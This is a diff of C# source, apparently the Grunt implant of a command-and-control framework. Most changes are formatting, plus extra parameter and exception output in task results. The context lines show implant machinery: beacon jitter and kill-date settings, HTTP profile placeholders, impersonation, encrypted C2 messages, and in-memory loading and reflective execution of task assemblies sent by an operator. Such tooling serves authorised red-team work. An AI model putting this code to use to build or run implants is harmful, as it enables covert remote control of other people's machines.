@@ -24,12 +24,12 @@ namespace GruntExecutor
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                 List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+                string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
@@ -79,7 +79,7 @@ namespace GruntExecutor
                     // A blank upward write, this helps in some cases with an HTTP Proxy
                     messenger.WriteTaskingMessage("");
                 }
-                catch (Exception) {}
+                catch (Exception) { }
 
                 List<KeyValuePair<string, Thread>> Jobs = new List<KeyValuePair<string, Thread>>();
                 WindowsImpersonationContext impersonationContext = null;
@@ -100,7 +100,7 @@ namespace GruntExecutor
                             string output = "";
                             if (message.Type == GruntTaskingType.SetOption)
                             {
-								string[] split = message.Message.Split(',');
+                                string[] split = message.Message.Split(',');
                                 if (split.Length >= 2 && int.TryParse(split[1], out int val))
                                 {
                                     if (split[0].Equals("Delay", StringComparison.CurrentCultureIgnoreCase))
@@ -131,7 +131,7 @@ namespace GruntExecutor
                                 messenger.WriteTaskingMessage(output, message.Name);
                                 return;
                             }
-                            else if(message.Type == GruntTaskingType.Jobs)
+                            else if (message.Type == GruntTaskingType.Jobs)
                             {
                                 if (!Jobs.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                 else
@@ -186,7 +186,8 @@ namespace GruntExecutor
                     if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                 }
             }
-            catch (Exception e) {
+            catch (Exception e)
+            {
                 Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
             }
         }
@@ -207,6 +208,15 @@ namespace GruntExecutor
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
+                        output += "\nParameters:\n";
+                        foreach (var par in parameters)
+                        {
+                            output += par + "\n";
+
+                        }
+                        output += "\n";
+                        output += "Result:\n";
+
                         var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                         if (results != null) { output += (string)results; }
                     }
@@ -226,7 +236,13 @@ namespace GruntExecutor
             }
             catch (Exception e)
             {
-                output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                output += e.ToString();
+                //output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                //output += "\n" + e + "\n";
+                //if (e.InnerException != null)
+                //{
+                //    output += "\nTask Inner Exception " + e.Message + Environment.NewLine + e.StackTrace;
+                //}
             }
             finally
             {
@@ -293,7 +309,7 @@ namespace GruntExecutor
     public class TaskingMessenger
     {
         private object _UpstreamLock = new object();
-        
+
         private IMessenger UpstreamMessenger { get; set; }
         private MessageCrafter Crafter { get; }
         private Profile Profile { get; }
@@ -383,7 +399,7 @@ namespace GruntExecutor
                             GruntEncryptedMessage message = this.Profile.ParsePostRequest(read);
                             if (message.GUID.Length == 20)
                             {
-                                 downstream.Identifier = message.GUID.Substring(10);
+                                downstream.Identifier = message.GUID.Substring(10);
                             }
                             else if (message.GUID.Length == 10)
                             {
@@ -721,10 +737,10 @@ namespace GruntExecutor
         public static GruntTaskingMessage FromJson(string message)
         {
             List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
-            if (parseList.Count < 3)  { return null; }
+            if (parseList.Count < 3) { return null; }
             return new GruntTaskingMessage
             {
-				Type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
+                Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                 Name = parseList[1],
                 Message = parseList[2],
                 Token = Convert.ToBoolean(parseList[3])
@@ -751,12 +767,12 @@ namespace GruntExecutor
             Tasking
         }
 
-		public string GUID { get; set; } = "";
+        public string GUID { get; set; } = "";
         public GruntEncryptedMessageType Type { get; set; }
         public string Meta { get; set; } = "";
-		public string IV { get; set; } = "";
-		public string EncryptedMessage { get; set; } = "";
-		public string HMAC { get; set; } = "";
+        public string IV { get; set; } = "";
+        public string EncryptedMessage { get; set; } = "";
+        public string HMAC { get; set; } = "";
 
         public bool VerifyHMAC(byte[] Key)
         {
@@ -775,8 +791,8 @@ namespace GruntExecutor
         private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
         public static GruntEncryptedMessage FromJson(string message)
         {
-			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
-            if (parseList.Count < 5)  { return null; }
+            List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
+            if (parseList.Count < 5) { return null; }
             return new GruntEncryptedMessage
             {
                 GUID = parseList[0],
@@ -908,15 +924,15 @@ namespace GruntExecutor
         public static List<string> Parse(string data, string format)
         {
             format = Regex.Escape(format).Replace("\\{", "{");
-			if(format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
-            if(format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
-            if(format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
-            if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
-            if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
-            if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
+            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
+            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
+            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
+            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
+            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
-			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
             if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
             if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
             if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
